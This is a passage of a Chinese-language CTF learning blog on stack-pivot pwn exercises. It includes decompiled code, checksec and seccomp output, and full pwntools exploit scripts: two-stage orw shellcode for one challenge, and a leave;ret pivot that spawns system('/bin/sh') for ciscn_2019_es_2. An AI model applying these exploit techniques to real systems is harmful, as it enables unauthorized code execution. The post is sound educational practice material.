sub_400A16();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> 0LL;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">int</span> sub_400A16()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char buf[<span class=\"number\">32</span>]; // [rsp+0h] [rbp-20h] BYREF</span><br><span class=\"line\"></span><br><span class=\"line\">  puts(<span class=\"string\">&quot;Easy shellcode, have fun!&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, 0x38uLL);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> puts(<span class=\"string\">&quot;Baddd! Focu5 me! Baddd! Baddd!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\tvoid *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset); 开始分配了一段空间,不知道干啥用的</p>\n<p>​\t\t然后安装了seccomp,设置io流,读入0x38 &#x3D; 56字节, 减去32 减去8rbp, 16个字节的溢出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/stackpivot/jikenotbad<span class=\"comment\"># checksec bad</span></span><br><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/stackpivot/jikenotbad/bad&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-<span class=\"number\">64</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX disabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x3ff000</span>)</span><br><span class=\"line\">    RWX:      Has RWX segments</span><br><span class=\"line\">    RUNPATH:  <span class=\"string\">b&#x27;/home/ubuntu/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t\t可以写shellcode, orw读取flag, 写的话,直接是写入到了一开始mmap的地址</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/stackpivot/jikenotbad<span class=\"comment\"># seccomp-tools dump ./bad</span></span><br><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> <span class=\"number\">0000</span>: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000004</span>  A = arch</span><br><span class=\"line\"> 0001: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x08</span> <span class=\"number\">0xc000003e</span>  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto <span class=\"number\">00</span>10</span><br><span class=\"line\"> 0002: <span class=\"number\">0x20</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  A = sys_number</span><br><span class=\"line\"> 0003: <span class=\"number\">0x35</span> <span class=\"number\">0x00</span> <span class=\"number\">0x01</span> <span class=\"number\">0x40000000</span>  <span class=\"keyword\">if</span> (A &lt; <span class=\"number\">0x40000000</span>) goto 0005</span><br><span class=\"line\"> 0004: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x05</span> <span class=\"number\">0xffffffff</span>  <span class=\"keyword\">if</span> (A != <span class=\"number\">0xffffffff</span>) goto <span class=\"number\">00</span>10</span><br><span class=\"line\"> 0005: <span class=\"number\">0x15</span> <span class=\"number\">0x03</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">if</span> (A == read) goto 0009</span><br><span class=\"line\"> 0006: <span class=\"number\">0x15</span> <span class=\"number\">0x02</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000001</span>  <span class=\"keyword\">if</span> (A == write) goto 0009</span><br><span class=\"line\"> 0007: <span class=\"number\">0x15</span> <span class=\"number\">0x01</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000002</span>  <span class=\"keyword\">if</span> (A == <span class=\"built_in\">open</span>) goto 0009</span><br><span class=\"line\"> 0008: <span class=\"number\">0x15</span> <span class=\"number\">0x00</span> <span class=\"number\">0x01</span> <span class=\"number\">0x0000003c</span>  <span class=\"keyword\">if</span> (A != exit) goto <span class=\"number\">00</span>10</span><br><span class=\"line\"> 0009: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x7fff0000</span>  <span class=\"keyword\">return</span> ALLOW</span><br><span class=\"line\"> <span class=\"number\">00</span>10: <span class=\"number\">0x06</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00</span> <span class=\"number\">0x00000000</span>  <span class=\"keyword\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>​\t\t需要分两次利用,因为无法直接把payload写入0x123000,所以先构造一个读取的payload,读入第二阶段payload后,再跳转过去</p>\n<p>​\t\t1.先利用第一次read读取第一阶段shellcode并跳转到这里进行执行,这串shellcode是读取第二阶段orw的shellcode到0x123000并跳转到那里</p>\n<p>​\t\t具体而言,第一阶段payload &#x3D; asm(read_shellcode).ljust(32,b”\\x00”) + p64(0) +p64(jmp_rsp)+asm(‘sub rsp,0x30;jmp rsp’)</p>\n<p>​\t\tjmp rsp相当于没干什么,只是跳到了下一条指令,但是如果没有这条指令,直接上汇编的话,识别不了,这里相当于给了一条指令的地址pop 出来的是指令的地址,jmp 过去的是可以直接执行的?</p>\n<p>​\t\tret的话,是pop rip,在返回地址处放上一条指令的地址才对,所以这里放了jmp_rsp,pop rip后rsp指向了 asm(‘sub rsp,0x30;jmp rsp’),jmp到这里才可以把这里的数据当成指令,然后正好可以继续执行指令</p>\n<p>​\t\t大概..需要补汇编基础了…</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410140744974.png\" alt=\"image-20230410140744974\" style=\"zoom:50%;\">\n\n<p>​\t\t2. 第一阶段的payload是读取第二阶段payload(orw)到0x123000,然后跳转过去</p>\n<h2 id=\"栈迁移\"><a href=\"#栈迁移\" class=\"headerlink\" title=\"栈迁移\"></a>栈迁移</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root@VM-<span class=\"number\">24</span>-<span class=\"number\">10</span>-ubuntu:/home/ubuntu/stackpivot/jikenotbad<span class=\"comment\"># ROPgadget --binary bad  --only &#x27;jmp&#x27;</span></span><br><span class=\"line\">Gadgets information</span><br><span class=\"line\">============================================================</span><br><span class=\"line\"><span class=\"number\">0x000000000040078b</span> : jmp <span class=\"number\">0x400770</span></span><br><span class=\"line\"><span class=\"number\">0x00000000004008eb</span> : jmp <span class=\"number\">0x400880</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000400b03</span> : jmp <span class=\"number\">0x400b7a</span></span><br><span class=\"line\"><span class=\"number\">0x0000000000400b87</span> : jmp qword ptr [rax - <span class=\"number\">0x68000000</span>]</span><br><span class=\"line\"><span class=\"number\">0x0000000000400ceb</span> : jmp qword ptr [rbp]</span><br><span class=\"line\"><span class=\"number\">0x0000000000400865</span> : jmp rax</span><br><span class=\"line\"><span class=\"number\">0x0000000000400a01</span> : jmp rsp</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t这里用到了jmp 这个转移的办法</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><p>exp一定要加上架构,不然报错,因为要进行汇编</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = remote(&quot;xxx&quot;,xxx)</span></span><br><span class=\"line\">sh = remote(<span class=\"string\">&quot;node4.buuoj.cn&quot;</span>,<span class=\"number\">29945</span>)</span><br><span class=\"line\"><span class=\"comment\">#sh = process(&quot;./bad&quot;)</span></span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b *0x000400A3E&quot;)</span></span><br><span class=\"line\">context.arch= <span class=\"string\">&#x27;x86_64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">vulnaddr = <span class=\"number\">0x0400A1E</span></span><br><span class=\"line\"></span><br><span class=\"line\">bssaddr = <span class=\"number\">0x006010Aa</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># mov rdi,buxingma3</span></span><br><span class=\"line\">orw_shellcode = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">mov rax,0x67616c662f</span></span><br><span class=\"line\"><span class=\"string\">push rax</span></span><br><span class=\"line\"><span class=\"string\">mov rdi,rsp</span></span><br><span class=\"line\"><span class=\"string\">xor rsi,rsi</span></span><br><span class=\"line\"><span class=\"string\">mov rax,0x2</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi,rax</span></span><br><span class=\"line\"><span class=\"string\">mov rsi,0x6010aa</span></span><br><span class=\"line\"><span class=\"string\">mov rdx,0x100</span></span><br><span class=\"line\"><span class=\"string\">xor rax,rax</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">mov rdi,1</span></span><br><span class=\"line\"><span class=\"string\">mov rsi,0x6010aa</span></span><br><span class=\"line\"><span class=\"string\">mov rdx,0x100</span></span><br><span class=\"line\"><span class=\"string\">mov rax,1</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">hlt</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">read_shellcode = <span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">mov rdi,0</span></span><br><span class=\"line\"><span class=\"string\">mov rsi,0x123000</span></span><br><span class=\"line\"><span class=\"string\">mov rdx,0x1000</span></span><br><span class=\"line\"><span class=\"string\">xor rax,rax</span></span><br><span class=\"line\"><span class=\"string\">syscall</span></span><br><span class=\"line\"><span class=\"string\">jmp rsi</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">jmp_rsp = <span class=\"number\">0x00000400a01</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 这几个payload都可以,本质都一样</span></span><br><span class=\"line\">payload = asm(read_shellcode).ljust(<span class=\"number\">32</span>,<span class=\"string\">b&quot;\\x00&quot;</span>) + p64(<span class=\"number\">0</span>) + p64(jmp_rsp) + <span class=\"string\">b&#x27;\\xE8\\xcb\\xff\\xff\\xff&#x27;</span></span><br><span class=\"line\"><span class=\"comment\">#payload = asm(read_shellcode).ljust(32,b&quot;\\x00&quot;) + p64(0) + p64(jmp_rsp)+asm(&#x27;sub rsp,0x30;jmp rsp&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#payload = asm(read_shellcode).ljust(32,b&quot;\\x00&quot;) + p64(0) + p64(jmp_rsp) + b&#x27;\\xE8\\xcb\\xff\\xff\\xff&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh.send(payload)</span></span><br><span class=\"line\"><span class=\"comment\">#sh.send(asm(orw_shellcode))</span></span><br><span class=\"line\">sh.sendafter(<span class=\"string\">b&#x27;Easy shellcode, have fun!&#x27;</span>,payload)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh)</span></span><br><span class=\"line\">sh.sendafter(<span class=\"string\">b&#x27;Baddd! Focu5 me! Baddd! Baddd!&#x27;</span>,asm(orw_shellcode))</span><br><span class=\"line\">sh.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"知识点总结\"><a href=\"#知识点总结\" class=\"headerlink\" title=\"知识点总结\"></a>知识点总结</h1><p>orw的shellcode编写</p>\n<h3 id=\"栈迁移-jmp-rsp-、及jmp-转移指令的含义\"><a href=\"#栈迁移-jmp-rsp-、及jmp-转移指令的含义\" class=\"headerlink\" title=\"栈迁移 jmp rsp 、及jmp 转移指令的含义\"></a>栈迁移 jmp rsp 、及jmp 转移指令的含义</h3><p>#payload &#x3D; asm(read_shellcode).ljust(32,b”\\x00”) + p64(0) + p64(jmp_rsp)+asm(‘sub rsp,0x30;jmp rsp’)</p>\n<h3 id=\"近转移call的含义\"><a href=\"#近转移call的含义\" class=\"headerlink\" title=\"近转移call的含义\"></a>近转移call的含义</h3><p>payload &#x3D; asm(read_shellcode).ljust(32,b”\\x00”) + p64(0) + p64(jmp_rsp) + b’\\xE8\\xcb\\xff\\xff\\xff’</p>\n<p>​\te8是 call的操作码 <em>#call 硬编码E8，后面加上四个字节的偏移(目标指令 - 下一条指令地址)</em></p>\n<p>hex(0xffffffcb - 0xffffffff) &#x3D; - 0x34</p>\n<p>那7f不会影响它吗?</p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410142020849.png\" alt=\"image-20230410142020849\" style=\"zoom: 33%;\">\n\n<img src=\"/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410143448769.png\" alt=\"image-20230410143448769\" style=\"zoom:50%;\">\n\n<h2 id=\"疑问\"><a href=\"#疑问\" class=\"headerlink\" title=\"疑问\"></a>疑问</h2><p>下断点断不下来,直接跳到后面read之后了</p>\n<p>近转移call的含义</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.csdn.net/qq_34010404/article/details/123809796\">https://blog.csdn.net/qq_34010404/article/details/123809796</a></p>\n<p><a href=\"https://blog.csdn.net/mcmuyanga/article/details/113389703\">https://blog.csdn.net/mcmuyanga/article/details/113389703</a></p>\n<h1 id=\"3-ciscn-2019-es-2\"><a href=\"#3-ciscn-2019-es-2\" class=\"headerlink\" title=\"3.ciscn_2019_es_2\"></a>3.ciscn_2019_es_2</h1><p>Ubuntu 18   2.27 32位</p>\n<h2 id=\"分析反编译代码及保护-1\"><a href=\"#分析反编译代码及保护-1\" class=\"headerlink\" title=\"分析反编译代码及保护\"></a>分析反编译代码及保护</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/ubuntu/stackpivot/ciscn_2019_es_2/ciscn_2019_es_2&#x27;</span></span><br><span class=\"line\">    Arch:     i386-<span class=\"number\">32</span>-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (<span class=\"number\">0x8046000</span>)</span><br><span class=\"line\">    RUNPATH:  <span class=\"string\">b&#x27;/home/ubuntu/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/&#x27;</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"built_in\">int</span> __cdecl main(<span class=\"built_in\">int</span> argc, const char **argv, const char **envp)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  init();</span><br><span class=\"line\">  puts(<span class=\"string\">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class=\"line\">  vul();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">int</span> vul()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char s; // [esp+0h] [ebp-28h]</span><br><span class=\"line\"></span><br><span class=\"line\">  memset(&amp;s, <span class=\"number\">0</span>, 0x20u);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, 0x30u);</span><br><span class=\"line\">  printf(<span class=\"string\">&quot;Hello, %s\\\\n&quot;</span>, &amp;s);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, &amp;s, 0x30u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> printf(<span class=\"string\">&quot;Hello, %s\\\\n&quot;</span>, &amp;s);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t\t能看到存在明显的栈溢出,而且是两次,<font color=\"red\">但是溢出的字节有限,只能覆盖个ebp和返回地址</font>,栈的大小是0x28, 后面4字节ebp,4字节返回地址, 正好0x30,也就是读取输入的大小</p>\n<p>​\t\t利用00截断的bug,可以让printf一直输出,memset设置了0x20个0,给覆盖掉即可,这样的话,第一次输出就可以得到栈的地址,然后通过覆盖返回地址为leave;ret;(加上函数本身就有一次leave;ret;), 两次leave;ret;就把esp迁移到栈的缓冲区上,就可以执行第二次输入的payload了</p>\n<h2 id=\"找缓冲区位置\"><a href=\"#找缓冲区位置\" class=\"headerlink\" title=\"找缓冲区位置\"></a>找缓冲区位置</h2><p>​\t\tpwndbg&gt; ni Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccc</p>\n<p>​\t\t输出的话,会从ecx(缓冲区开始的地方),一直往下输出,</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410115230094.png\" alt=\"image-20230410115230094\"></p>\n<p>​\t\t所以0x28之后的就是ebp了,ebp和ecx的差了0x28个字节,所以ebp-0x28就是ecx</p>\n<p>​\t\t<font color=\"red\">这种思路不对, 因为输出的是ebp这个地址存的值,而不是ebp本身的值</font>,这个值,是ebp的地址加0x10</p>\n<p>​\t\t所以ecx的地址应当是接收到的ebp存储的值-0x28-0x10 所以就是ebp-0x38</p>\n<h2 id=\"栈迁移-1\"><a href=\"#栈迁移-1\" class=\"headerlink\" title=\"栈迁移\"></a>栈迁移</h2><p>​\t\t可以把ebp伪造成ecx的地址, 然后返回地址leave;ret; (再加上本身函数就有一个leave;ret;) 这样两次就可以修改esp,改变程序控制流, 回去打system(”&#x2F;bin&#x2F;sh”)</p>\n<h2 id=\"system-getshell\"><a href=\"#system-getshell\" class=\"headerlink\" title=\"system getshell\"></a>system getshell</h2><p>​\t\tsystem的话 用plt表的0x804A018 ,got表不行吗?</p>\n<p>​\t\tplt的顺序到底是啥…先plt还是先got, 还是说因为plt就是跳到got,所以直接引用got也可以</p>\n<p>​\t\tp32(system_addr) + p32(0) + p32(”&#x2F;bin&#x2F;sh”) <font color=\"red\">这个是错误的,为什么呢??? 为什么直接用值不行呢??</font></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410123536836.png\" alt=\"image-20230410123536836\" style=\"zoom: 33%;\">\n\n<p>​\t\t应该是payload &#x3D; p32(callsystem)+p32(0)+p32(ecx_addr+12)+b”&#x2F;bin&#x2F;sh”</p>\n<p>​\t\t直接binsh字符串是不行的,需要一个指向这个字符串的地址,所以用的这个,记得后面要加\\x00作为结束符号</p>\n<h2 id=\"exp-1\"><a href=\"#exp-1\" class=\"headerlink\" title=\"exp\"></a>exp</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sh = remote(&quot;node4.buuoj.cn&quot;,29945)</span></span><br><span class=\"line\">sh = process(<span class=\"string\">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class=\"line\">context.log_level= <span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(sh,&quot;b _start&quot;)</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch= &#x27;x86_64&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">0x20</span> + <span class=\"string\">b&quot;b&quot;</span>*<span class=\"number\">8</span></span><br><span class=\"line\">sh.sendafter(<span class=\"string\">b&#x27;name?&#x27;</span>,payload)</span><br><span class=\"line\">sh.recvuntil(<span class=\"string\">b&quot;bbbbbbbb&quot;</span>)</span><br><span class=\"line\">ecx_addr = u32(sh.recv(<span class=\"number\">4</span>)) - <span class=\"number\">0x38</span></span><br><span class=\"line\"></span><br><span class=\"line\">callsystem = <span class=\"number\">0x8048400</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x080484b8</span></span><br><span class=\"line\">payload = p32(callsystem) + p32(<span class=\"number\">0</span>) + p32(ecx_addr+<span class=\"number\">12</span>)+<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#payload = p32(callsystem) + p32(leave_ret) + b&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\">payload  = payload.ljust(<span class=\"number\">0x28</span>,<span class=\"string\">b&quot;a&quot;</span>)</span><br><span class=\"line\">payload += p32(ecx_addr-<span class=\"number\">4</span>)+p32(leave_ret)</span><br><span class=\"line\">sh.send(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"做题思路及知识点\"><a href=\"#做题思路及知识点\" class=\"headerlink\" title=\"做题思路及知识点\"></a>做题思路及知识点</h2><p>1.可以明确这题本身不能往bss写的,没有途径,只能往栈上写</p>\n<p>2.本身栈里存的是0? 怎么知道   memset那里设置了</p>\n<p>3.read结束之后不会在末尾加上’\\x00’，而printf不遇到’\\x00’就不会停止打印，  这个知识点怎么来的呢???? 前面的memset提示??  或许可以是一个知识储备,这个好像是一个常用的点</p>\n<p>4.假的后门函数,这个是echo 字符串flag</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">.text:0804854B hack            proc near</span><br><span class=\"line\">.text:0804854B ; __unwind &#123;</span><br><span class=\"line\">.text:0804854B                 push    ebp</span><br><span class=\"line\">.text:0804854C                 mov     ebp, esp</span><br><span class=\"line\">.text:0804854E                 sub     esp, <span class=\"number\">8</span></span><br><span class=\"line\">.text:08048551                 sub     esp, 0Ch</span><br><span class=\"line\">.text:08048554                 push    offset command  ; <span class=\"string\">&quot;echo flag&quot;</span></span><br><span class=\"line\">.text:08048559                 call    _system</span><br><span class=\"line\">.text:0804855E                 add     esp, 10h</span><br><span class=\"line\">.text:08048561                 nop</span><br><span class=\"line\">.text:08048562                 leave</span><br><span class=\"line\">.text:08048563                 retn</span><br><span class=\"line\">.text:08048563 ; &#125; // starts at 804854B</span><br><span class=\"line\">.text:08048563 hack            endp</span><br></pre></td></tr></table></figure>\n\n\n\n<p>计算机基础不是很牢固…所以有些细节理解不到..</p>\n<h2 id=\"留下的疑问\"><a href=\"#留下的疑问\" class=\"headerlink\" title=\"留下的疑问\"></a>留下的疑问</h2><p>​\t\tsystem的话 用plt表的0x804A018 ,got表不行吗?</p>\n<p>​\t\tplt的顺序到底是啥…先plt还是先got, 还是说因为plt就是跳到got,所以直接引用got也可以</p>\n<h1 id=\"参考-1\"><a href=\"#参考-1\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://blog.csdn.net/qq_34010404/article/details/123809796\">https://blog.csdn.net/qq_34010404/article/details/123809796</a></p>\n<p><a href=\"https://blog.csdn.net/mcmuyanga/article/details/113389703\">https://blog.csdn.net/mcmuyanga/article/details/113389703</a></p>\n<p><a href=\"https://blog.csdn.net/qq_45691294/article/details/112196127\">https://blog.csdn.net/qq_45691294/article/details/112196127</a></p>\n<p><a href=\"https://blog.csdn.net/qq_41696518/article/details/126665825\">https://blog.csdn.net/qq_41696518/article/details/126665825</a></p>\n<p><a 